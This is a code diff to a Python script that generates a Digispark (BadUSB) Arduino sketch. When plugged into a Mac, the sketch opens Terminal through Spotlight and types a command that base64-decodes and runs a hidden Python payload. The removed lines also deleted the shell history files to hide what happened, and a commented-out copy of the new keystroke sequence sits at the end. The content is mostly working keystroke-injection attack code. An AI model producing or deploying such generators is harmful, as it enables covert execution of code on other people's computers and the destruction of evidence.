@@ -49,9 +49,11 @@ else: #generate Arduino sketch
   PAYLOAD_BYTES = payload.encode("ascii")
   ENCODED_BYTES = base64.b64encode(PAYLOAD_BYTES)
   ENCODED_PAYLOAD = ENCODED_BYTES.decode("ascii") #encoded payload to be loaded in Ardiono file
-  ARDUINO_SKETCH_TEMPLATE = f"DELAY {INITIAL_DELAY}\n\tGUI SPACE\n\tDELAY 100\n\tSTRING Terminal\n\tDELAY 200\n\tENTER\n\tDELAY 200\n\tSTRING python -c \"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\"\n\tENTER\n\tDELAY 700\n\tGUI q\n\tDELAY 100\n\tGUI SPACE\n\tDELAY 100\n\tSTRING Terminal\n\tDELAY 200\n\tENTER\n\tDELAY 100\n\tSTRING rm ~/.bash_history ~/.zsh_history\n\tENTER\n\tDELAY 100\n\tGUI q\n"
-  ARDIONO_FILE_CONTENT = f"#include\t\"DigiKeyboard.h\"\n\nvoid setup()\t{CURLY_L}\n\t//LEAVE EMPTY\n{CURLY_R}\n\nvoid loop()\t{CURLY_L}\n\t{ARDUINO_SKETCH_TEMPLATE}{CURLY_R}"
+  ARDUINO_SKETCH_LOOP = f"\n\tDigiKeyboard.delay({INITIAL_DELAY});\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print(\"Terminal\");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print(\"python3 -c \\\"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\\\"\");\n\tfor(;;){CURLY_L}{CURLY_R}\n"
+  ARDIONO_FILE_CONTENT = f"#include \"DigiKeyboard.h\"\n\nvoid setup() {CURLY_L}{CURLY_R}\n\nvoid loop() {CURLY_L}{ARDUINO_SKETCH_LOOP}{CURLY_R}\n"
   write_file("digispark_sketch.ino", ARDIONO_FILE_CONTENT)
 
 
   
+
+  # \tDigiKeyboard.delay(1000);\n\tDigiKeyboard.sendKeyStroke(0);\n\tDigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);\n\tDigiKeyboard.delay(400);\n\tDigiKeyboard.print("Terminal");\n\tDigiKeyboard.delay(200);\n\tDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\tDigiKeyboard.delay(1500);\n\tDigiKeyboard.print("python3 -c \"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\"");\n\tfor(;;){ /*empty*/ }\n
